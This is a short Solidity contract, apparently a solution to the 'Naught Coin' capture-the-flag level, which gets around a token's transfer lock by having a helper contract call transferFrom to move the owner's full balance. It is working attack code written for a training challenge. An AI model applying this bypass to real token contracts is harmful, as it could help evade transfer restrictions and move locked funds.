// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract NaughtCoinAttacker {
    IERC20 naughtCoin;
    address owner;
    address recipient;

    constructor(address _naughtCoin, address _recipient) {
        naughtCoin = IERC20(_naughtCoin);
        owner = msg.sender;
        recipient = _recipient;
    }

    function attack() public {
        require (msg.sender == owner, "caller must be be owner");
        naughtCoin.transferFrom(msg.sender,  recipient,  naughtCoin.balanceOf(msg.sender));
    }


}